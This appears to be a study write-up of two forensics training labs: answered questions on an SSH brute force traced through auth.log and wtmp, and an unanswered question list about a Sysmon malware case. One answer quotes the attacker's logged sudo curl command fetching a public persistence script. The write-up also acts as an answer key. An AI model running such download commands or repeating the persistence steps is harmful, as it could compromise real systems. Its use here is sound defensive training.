---
icon: worm
---

# DFIR



## Brutus

In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.

* unzip doesnt work, extract w **`7z x <file>`**&#x20;

### T1 - Analyzing the auth.log, can you identify the IP address used by the attacker to carry out a brute force attack?

```bash
cat auth.log
```

* answer: **65.2.161.68**

<figure><img src="../.gitbook/assets/image (205).png" alt=""><figcaption></figcaption></figure>

### T2 - The brute force attempts were successful, and the attacker gained access to an account on the server. What is the username of this account?

```bash
cat auth.log

OR

grep "Accepted" auto.log
    # cause if ssh connection is established, it always gives message "Accepted password for <user> from <IP> port <p>...
```

* answer: **root**

<figure><img src="../.gitbook/assets/image (206).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (207).png" alt=""><figcaption></figcaption></figure>

### T3 - Can you identify the timestamp when the attacker manually logged in to the server to carry out their objectives?

* To better understand two given files, here is their role:

| auth.log                                                                                     | WTMP                                                                                                                                                                                                                                 |
| -------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| The auth.log in the context of logging into a host tracks specifically authentication events | Entries in the WTMP record the creation and destruction of terminals, or the assignment and release of terminals to users. In this context we are able to track the interactive session created by the TA accurately within the WTMP |

* second file ⇒ wtmp
  * cat wtmp wont help us, cause its a binary file...not human readable
    * lets convert it into readable parameters

```bash
last -f wtmp
```

* doesnt help us much, because these are just logs of sessions
* from previous analysis of auth.log file we know:
  * TA authenticated at 06:32:44 with the root account, however for this specific analysis we will use the WTMP artefact. Before continuing, please see below a brief explanation as to the discrepancy in time between the WTMP and auth.log artefacts.
  * Reviewing the output of utmpdump wtmp we are able to confirm the successful opening of an interactive terminal session by the TA at 06:32:45.

```bash
utmpdump wtmp
```

<figure><img src="../.gitbook/assets/image (208).png" alt=""><figcaption></figcaption></figure>

* answer: **2024-03-06 06:32:45**

### T4 - SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?

* we got it just 2 lines after answer for T2, where we identified that user ROOT logged-in successfully at 06:32:44...
* answer: **37**

<figure><img src="../.gitbook/assets/image (209).png" alt=""><figcaption></figcaption></figure>

### T5 - The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?

* another few lines after...
  * when he connected via ssh as root user, he created both group and user called cyberjunkie...
* answer: **cyberjunkie**

<figure><img src="../.gitbook/assets/image (211).png" alt=""><figcaption></figcaption></figure>

### T6 - What is the MITRE ATT\&CK sub-technique ID used for persistence?

* We understand a new user account was created as a method of achieving persistence and the account was a local account on the compromised host. We now need to translate this into a technique ID utilising the MITRE ATT\&CK framework. The MITRE ATT\&CK framework categorises various tactics and techniques used by attackers.
* search at MITTRE ATT\&CK website...
  * [https://attack.mitre.org/tactics/TA0003/](https://attack.mitre.org/tactics/TA0003/)
    * "Persistence" -> "Create Account" technique... === T1136
      * Sub-technique ... "Local Account" === .001
* answer: **T1136.001**

<figure><img src="../.gitbook/assets/image (212).png" alt=""><figcaption></figcaption></figure>

### T7 - How long did the attacker's first SSH session last based on the previously confirmed authentication time and session ending within the auth.log? (seconds)

* we can do it manually or automatically...
  * a) manually search for times
    * login time -> 06:32:45
    * logout time -> 06:37:24
    * RESULT -> 04:39 min = 279 sec
  * a) automatically

```bash
grep "2491" auth.log | grep "Accepted"
grep "2491" auth.log | grep "session closed"

# 2491 = sshd session number...
```

<figure><img src="../.gitbook/assets/image (214).png" alt=""><figcaption></figcaption></figure>

* login time -> 06:32:45
* logout time -> 06:37:24
* RESULT -> 04:39 min = 279 sec



* answer: **279**

### T8 - The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?

* just search the "cat auth.log" - at the ending, there is COMMAND = \<flag>
* answer: **/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh**

<figure><img src="../.gitbook/assets/image (215).png" alt=""><figcaption></figcaption></figure>



## Unit42

In this Sherlock, you will familiarize yourself with Sysmon logs and various useful EventIDs for identifying and analyzing malicious activities on a Windows system. Palo Alto's Unit42 recently conducted research on an UltraVNC campaign, wherein attackers utilized a backdoored version of UltraVNC to maintain access to systems. This lab is inspired by that campaign and guides participants through the initial access stage of the campaign.

### T1 - How many Event logs are there with Event ID 11?



### T2 - Whenever a process is created in memory, an event with Event ID 1 is recorded with details such as command line, hashes, process path, parent process path, etc. This information is very useful for an analyst because it allows us to see all programs executed on a system, which means we can spot any malicious processes being executed. What is the malicious process that infected the victim's system?



### T3 - Which Cloud drive was used to distribute the malware?



### T4 - For many of the files it wrote to disk, the initial malicious file used a defense evasion technique called Time Stomping, where the file creation date is changed to make it appear older and blend in with other files. What was the timestamp changed to for the PDF file?



### T5 - The malicious file dropped a few files on disk. Where was "once.cmd" created on disk? Please answer with the full path along with the filename.



### T6 - The malicious file attempted to reach a dummy domain, most likely to check the internet connection status. What domain name did it try to connect to?



### T7 - Which IP address did the malicious process try to reach out to?



### T8 - The malicious process terminated itself after infecting the PC with a backdoored variant of UltraVNC. When did the process terminate itself?
